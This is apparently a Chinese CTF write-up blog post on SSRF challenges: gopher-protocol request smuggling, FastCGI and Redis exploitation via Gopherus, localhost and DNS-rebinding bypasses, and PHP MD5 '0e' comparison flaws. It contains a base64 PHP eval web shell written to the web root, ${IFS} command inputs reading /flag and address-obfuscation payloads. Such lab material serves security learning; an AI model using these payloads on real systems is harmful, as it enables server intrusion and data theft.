<p>Gopher是Internet上一个非常有名的信息查找系统，由明尼苏达大学设计，并以该校的运动队“金色地鼠”（俚语：“去找”）来命名。在时间上，比Internet还要早几年。它只支持文本，不支持图像。该协议将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，Gopher客户程序和Gopher服务器相连接，并能使用菜单结构显示其它的菜单、文档或文件，并索引。同时可通过Telnet远程访问其它应用程序。Gopher协议使得Internet上的所有Gopher客户程序，能够与Internet上的所有已“注册”的Gopher服务器进行对话。<br>Gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求：gopher协议支持发出GET、POST请求，先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）<br>在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它</p>
</blockquote>
<p><strong><code>gopher协议没有默认端口，所以需要指定web端口，而且需要指定POST方法。回车换行使用%0D%0A替换%0A,POST参数之间的&amp;分隔符也要进行url编码</code></strong></p>
<p>因此 为了使用gopher协议进行攻击 就必须将<code>&amp;</code>进行url编码==（第一次）== 而gopher协议将上面第一次的字符串传进服务器时 url解码==（一次）== 此时又会出现字符<code>&amp;</code> 而此时的url里gopher并不认可即将继续跳转的地址==（含有未转码的&amp;）== 因此我们要让第一次的<code>&amp;</code>转码<code>%26</code>再次转码为<code>%2526</code> 最后需要将上面的内容装进gopher协议里 所以进行最后一次转码 放进url里</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41107295/article/details/103026470">ssrf对gopher协议的利用</a></p>
<ul>
<li>做题步骤</li>
</ul>
<p>dirsearch -&gt; 利用php伪协议file://访问一下 得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">#flag.php</span><br><span class="xml"></span><br><span class="xml"></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"></span><br><span class="php">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="php"></span><br><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="php">    <span class="hljs-keyword">return</span>;</span><br><span class="php">&#125;</span><br><span class="php"></span><br><span class="php"><span class="hljs-variable">$flag</span>=getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);</span><br><span class="php"><span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$flag</span>);</span><br><span class="php"></span><br><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;</span><br><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;</span><br><span class="php">    <span class="hljs-keyword">exit</span>;</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=</span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-comment">--&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"># 要求访问的远程地址必须为127.0.0.1(相当于实战中必须让远程目标主机本地访问)</span><br></code></pre></td></tr></table></figure>

<p>前端访问一下flag.php，查看源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=399be68d73e23ae8f326b4850128f33c--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>用post的方式把key传进flag.php -&gt; 构造带key的POST包  抓包重放</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>36<br><br><span class="vala">key=---</span><br><span class="vala"><span class="hljs-meta">#注意此处的Content-Length要与POST内容长度一致</span></span><br><span class="vala"><span class="hljs-meta">#上面的整个POST包进行url编码</span></span><br><span class="vala"><span class="hljs-meta">#将得到的编码中的所有%0A(数字0) 替换为%0D%0A (%0A为换行符——另起一新行，光标在新行的开头；%0D为回车——光标回到旧行(光标当前所在的行)的开头 </span></span><br><span class="vala"><span class="hljs-meta">#再将上面得到的编码再一次编码！</span></span><br></code></pre></td></tr></table></figure>

<p>将上面得到的拼接==gopher协议==重放即可 <img src="https://img-blog.csdnimg.cn/20210314175949642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/109548606?spm=1001.2014.3001.5501">wp参考博客</a></p>
<h2 id="文件上传-SSRF"><a href="#文件上传-SSRF" class="headerlink" title="文件上传(SSRF)"></a>文件上传(SSRF)</h2><p>同上一题查看到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure>



<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">#flag.php</span><br><span class="xml"></span><br><span class="xml"></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"></span><br><span class="php">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="php"></span><br><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="php">    <span class="hljs-keyword">return</span>;</span><br><span class="php">&#125;</span><br><span class="php"></span><br><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;</span><br><span class="php">    <span class="hljs-keyword">echo</span> getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);</span><br><span class="php">    <span class="hljs-keyword">exit</span>;</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Upload Webshell</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">#这里在html表单里再加一行file换成submit 增加一个文件上传的按钮</span><br></code></pre></td></tr></table></figure>

<p>上传一个文件 抓包改包和上一题差不多 但不需要构造post包</p>
<h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
<p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-comment">/* Header */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> version; <span class="hljs-comment">// 版本</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> type; <span class="hljs-comment">// 本次record的类型</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB1; <span class="hljs-comment">// 本次record对应的请求id</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB0;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB1; <span class="hljs-comment">// body体的大小</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB0;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingLength; <span class="hljs-comment">// 额外块大小</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> reserved; <br> <br>  <span class="hljs-comment">/* Body */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentData[contentLength];<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure>

<p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p>
<p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p>
<p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p>
<p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p>
<ul>
<li>做题</li>
</ul>
<p>利用Gopherus生成payload</p>
<blockquote>
<p>已知存在的文件/var/www/html/index.php</p>
<p><strong>base64(<?php @eval($_POST['pass']);?>)=PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</strong></p>
<p>要执行的命令echo <code>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</code>|base64 -d &gt;/var/www/html/shell.php</p>
</blockquote>
<p>同上转码两次即可</p>
<h2 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h2><p>开放端口6379</p>
<p>Gopherus生成payload 进行两次转码 然后就在get传参cmd=ls…… 貌似要绕过空格</p>
<p><img src="https://img-blog.csdnimg.cn/20210423214036185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=ls<span class="hljs-variable">$&#123;IFS&#125;</span>/<br><span class="hljs-attr">cmd</span>=cat<span class="hljs-variable">$&#123;IFS&#125;</span>/flag<br></code></pre></td></tr></table></figure>


<p>不利用该脚本 自己写一个redis协议 写进一句话也可以 Gopherus生成的payload必须是cmd传参</p>
<h2 id="Training-Rebots"><a href="#Training-Rebots" class="headerlink" title="Training-Rebots"></a>Training-Rebots</h2><p>访问一下rebots.txt文件 根据允许和不允许抓包改包即可</p>
<h2 id="Can-you-anthenticate-to-this-website"><a href="#Can-you-anthenticate-to-this-website" class="headerlink" title="Can you anthenticate to this website?"></a>Can you anthenticate to this website?</h2><p>首先可以dirsearch扫一下要干什么<br><img src="https://img-blog.csdnimg.cn/20210317212908628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>很明显是登陆操作了<br>我们没办法盲目地登录 必须查看到登录源码才能进去，这里总结一下如何查看源码</p>
<p><strong>对网页源码的查看方法</strong></p>
<ol>
<li><p>审查元素的方式 右击或者F12</p>
</li>
<li><p>右击查看页面源代码或者url开头写<code>view-source:</code>也可以ctrl+u</p>
</li>
<li><p>phps文件类型主要由php组与php源关联。通常，php文件将由web服务器和php可执行文件解释(在服务器注册过的MIME类型的文件)，网站访问者看不到php文件代码。如果将文件扩展名设为.phps，服务器配置正确 将会输出源代码的彩色格式版本，而不是生成的HTML。</p>
</li>
<li><p>利用php伪协议<code>php://filter</code><br> 那么此题的就是用到<code>.phps</code>解开此题<br> 上面dirsearch并未发现这个文件 是脚本爆破的问题 可以向字典里面添加规则 在dirsearch/db下的dicc.txt 在index.php下添加一条index.phps即可<br> <img src="https://img-blog.csdnimg.cn/20210317221647640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br> 查看源码：<img src="https://img-blog.csdnimg.cn/20210317221810408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">发现里边首先url解码GET得到的字符串 松散比较等于<code>&quot;admin&quot;</code> 构造<code>id=admin</code></p>
</li>
</ol>
<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210423211244499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>常见的符号绕过有 @ # / \ ? 多试一试。。</p>
<h2 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h2><p>127.0.0.1使用的是点分十进制 绕过如下</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>

<p>8进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>16进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>10进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>SSRF中有个很重要的一点是请求可能会跟随302跳转</p>
<p><img src="https://img-blog.csdnimg.cn/20210423211528881.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h2 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h2><p>DNS概念略 </p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">TTL</span><br><span class="hljs-selector-tag">TTL</span>值全称是“生存时间（<span class="hljs-selector-tag">Time</span> <span class="hljs-selector-tag">To</span> <span class="hljs-selector-tag">Live</span>)”，简单的说它表示<span class="hljs-selector-tag">DNS</span>记录在<span class="hljs-selector-tag">DNS</span>服务器上缓存时间，数值越小，修改记录各地生效时间越快。<br><br>当各地的<span class="hljs-selector-tag">DNS</span>(LDNS)服务器接受到解析请求时，就会向域名指定的授权<span class="hljs-selector-tag">DNS</span>服务器发出解析请求从而获得解析记录；该解析记录会在<span class="hljs-selector-tag">DNS</span>(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，<span class="hljs-selector-tag">DNS</span>服务器将不再向授权<span class="hljs-selector-tag">DNS</span>服务器发出请求，而是直接返回刚才获得的记录；而这个记录在<span class="hljs-selector-tag">DNS</span>服务器上保留的时间，就是<span class="hljs-selector-tag">TTL</span>值。<br></code></pre></td></tr></table></figure>



<p>利用已经控制的DNS服务器 恶意DNS服务器将TTL值设置为1秒 向查询域的机器响应真实的恶意IP地址  让其缓存迅速失效 （常将访问的目标IP篡改为具有攻击性的地址）</p>
<p>可以让目标机器的浏览器访问恶意的网站 解析其恶意代码执行如js</p>
<p>下面的两个网站都是测试这个DNS重绑定漏洞的</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br><img src="https://img-blog.csdnimg.cn/20210423211706570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">7</span>f000001<span class="hljs-selector-class">.c0a80001</span><span class="hljs-selector-class">.rbndr</span><span class="hljs-selector-class">.us</span> #payload<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io/</a></p>
<p><img src="https://img-blog.csdnimg.cn/20210423211753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>.xip.io #payload<br></code></pre></td></tr></table></figure>


<p>后面跟/flag.php 题解！</p>
<h2 id="md5绕过-hash比较缺陷"><a href="#md5绕过-hash比较缺陷" class="headerlink" title="md5绕过(hash比较缺陷)"></a>md5绕过(hash比较缺陷)</h2><p>因为md5的特性 它有两个漏洞</p>
<ul>
<li>MD5加密后的值若开头为0e的话 则认为MD5的值相等</li>
</ul>
<p>PHP在处理哈希字符串是 使用**!=** 和 <strong>==<strong>来比较 会把每一个</strong>OE</strong>开头的字符串都解释为0（PHP的科学计数法）</p>
<table>
<thead>
<tr>
<th align="left">字符串</th>
<th align="left">MD5加密值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">QNKCDZO</td>
<td align="left">0e830400451993494058024219903391</td>
</tr>
<tr>
<td align="left">s878926199a</td>
<td align="left">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="left">s155964671a</td>
<td align="left">0e342768416822451524974117254469</td>
</tr>
<tr>
<td align="left">s214587387a</td>
<td align="left">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="left">s878926199a</td>
<td align="left">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="left">s1091221200a</td>
<td align="left">0e940624217856561557816327384675</td>
</tr>
<tr>
<td align="left">0e215962017</td>
<td align="left">0e291242476940776845150308577824</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">字符串</th>
<th>sha1加密值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">aaroZmOk</td>
<td>0e66507019969427134894567494305185566735</td>
</tr>
<tr>
<td align="left">aaK1STfY</td>
<td>0e76658526655756207688271159624026011393</td>
</tr>
<tr>
<td align="left">aaO8zKZF</td>
<td>0e89257456677279068558073954252716165668</td>
</tr>
<tr>
<td align="left">aa3OFF9m</td>
<td>0e36977786278517984959260394024281014729</td>
</tr>
</tbody></table>
<ul>
<li>MD5函数不能处理数组</li>
</ul>
<p>MD5()和sha1()处理数组都会返回NULL (a[]=1)</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源码首先看到<img src="https://raw.githubusercontent.com/wo02ie/photo/main//2021/06/07/.png" srcset="/img/loading.gif" lazyload alt="image-20210604194119854"></p>
<p>WAF不可知，稍后再处理；API中有calc.php，尝试访问，OK的</p>
